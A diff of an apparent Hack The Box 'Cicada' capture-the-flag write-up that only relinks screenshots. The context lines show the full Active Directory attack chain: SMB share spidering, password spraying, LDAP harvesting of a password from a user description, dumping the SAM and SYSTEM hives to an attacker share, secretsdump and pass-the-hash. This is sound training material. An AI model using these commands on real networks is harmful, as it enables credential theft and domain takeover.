@@ -198,7 +198,7 @@ Server type string: null
 ```
 netexec smb $target -u 'guest' -p '' --shares -M spider_plus -o DOWNLOAD_FLAG=True OUTPUT_FOLDER=. EXCLUDE_FILTER='PRINT$','IPC$','SYSVOL','NETLOGON' EXCLUDE_EXTS='lnk','ini','ico'
 ```
-![[Pasted image 20251110131220.png]]
+![Image](/assets/img/htb-writeups/Pasted image 20251110131220.png)
 ```
   ares@legion:~/HackTheBox/Cicada/10.129.61.174/HR$ strings Notice\ from\ HR.txt 
 Dear new hire!
@@ -209,17 +209,17 @@ Your default password is: Cicada$M6Corpb*@Lp#nZp!8
 ```
   impacket-lookupsid anonymous@10.129.61.174 | tee usernames
 ```
-  ![[Pasted image 20251110133137.png]]
+  ![Image](/assets/img/htb-writeups/Pasted image 20251110133137.png)
 ```
   crackmapexec smb $target -u users.txt -p 'Cicada$M6Corpb*@Lp#nZp!8' --continue-on-success
 ```
-![[Pasted image 20251110133551.png]]
+![Image](/assets/img/htb-writeups/Pasted image 20251110133551.png)
 
 Enumarate AD metadata for passwords:
 ```
 netexec ldap $target -u 'michael.wrightson' -p 'Cicada$M6Corpb*@Lp#nZp!8' -d cicada.htb --kdcHost $target --users
 ```
-![[Pasted image 20251110141128.png]]
+![Image](/assets/img/htb-writeups/Pasted image 20251110141128.png)
 ```
 ldapsearch -H ldap://$target -x -D "michael.wrightson@cicada.htb" -w 'Cicada$M6Corpb*@Lp#nZp!8' -b "DC=cicada,DC=htb" "(objectClass=user)" description info
 ```
@@ -228,23 +228,23 @@ ldapsearch -H ldap://$target -x -D "michael.wrightson@cicada.htb" -w 'Cicada$M6C
 dn: CN=David Orelious,CN=Users,DC=cicada,DC=htb
 description: Just in case I forget my password is aRt$Lp#7t*VQ!3
 
-![[Pasted image 20251110140553.png]]
+![Image](/assets/img/htb-writeups/Pasted image 20251110140553.png)
 
 ```
 smbclient //10.129.61.174/DEV -U 'david.orelious%aRt$Lp#7t*VQ!3' -W cicada.htb -c 'prompt OFF; recurse ON; mget *'
 ```
-![[Pasted image 20251110142124.png]]
+![Image](/assets/img/htb-writeups/Pasted image 20251110142124.png)
 
 $username = "emily.oscars"
 $password = ConvertTo-SecureString "Q!3@Lp#M6b*7t*Vt" -AsPlainText -Force
-![[Pasted image 20251110143314.png]]
+![Image](/assets/img/htb-writeups/Pasted image 20251110143314.png)
 
 ```
 bundle exec evil-winrm.rb -i 10.129.61.174 -u emily.oscars -p 'Q!3@Lp#M6b*7t*Vt'
 ```
 
 SeBackupPrivilege
-![[Pasted image 20251110151546.png]]
+![Image](/assets/img/htb-writeups/Pasted image 20251110151546.png)
 ```
 reg save hklm\sam C:\Windows\Temp\sam
 reg save hklm\system C:\Windows\Temp\system
@@ -263,7 +263,7 @@ copy C:\Windows\Temp\system \\10.10.14.183\myshare\
 ```
 impacket-secretsdump -sam sam -system system LOCAL 
 ```
-![[Pasted image 20251110152127.png]]
+![Image](/assets/img/htb-writeups/Pasted image 20251110152127.png)
 
 ```
 bundle exec evil-winrm.rb -i 10.129.61.174 -u Administrator -H '2b87e7c93a3e8a0ea4a581937016f341'
